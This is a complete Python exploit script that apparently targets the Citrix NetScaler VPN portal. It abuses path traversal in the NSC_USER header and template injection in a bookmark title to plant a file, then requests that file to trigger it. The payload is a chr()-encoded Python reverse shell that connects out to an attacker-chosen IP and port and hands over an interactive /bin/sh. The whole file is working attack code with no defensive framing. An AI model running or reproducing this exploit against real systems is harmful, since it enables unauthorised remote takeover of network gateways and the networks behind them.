#!/usr/bin/env python

import requests
import string
import random
import argparse


def random_string(num):
    letters = string.ascii_lowercase
    return "".join(random.choice(letters) for i in range(num))


def encode_payload(payload):
    encoded = ""
    for c in payload:
       encoded += "chr(" + str(ord(c)) + ")."

    encoded = encoded[:-1]
    return encoded


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target_ip")
    parser.add_argument("target_port", type=int)
    parser.add_argument("reverse_ip")
    parser.add_argument("reverse_port", type=int)
    args = parser.parse_args()

    payload = ("""/var/python/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (args.reverse_ip, args.reverse_port))

    encoded_payload = encode_payload(payload)

    filename = random_string(4)
    nonce = random_string(4)
    randomuser = random_string(4)

    payload ="[% template.new({'BLOCK'='print readpipe(" + encoded_payload + ")'})%]"
    headers = {
        "User-Agent": "Mozilla",
        "NSC_USER": "../../../netscaler/portal/templates/%s" % filename,
        "NSC_NONCE": nonce,
    }
    data = {
        "url": "127.0.0.1",
        "title": payload,
        "desc": "desc",
        "UI_inuse": "a",
    }

    url = "https://%s:%d/vpn/../vpns/portal/scripts/newbm.pl" % (args.target_ip, args.target_port)
    requests.post(url, headers=headers, data=data, verify=False)

    headers = {
        "User-Agent": "Mozilla",
        "NSC_USER": randomuser,
        "NSC_NONCE": nonce,
    }

    url = "https://%s:%d/vpn/../vpns/portal/%s.xml" % (args.target_ip, args.target_port, filename)
    requests.get(url, headers=headers, verify=False)


if __name__ == "__main__":
    main()

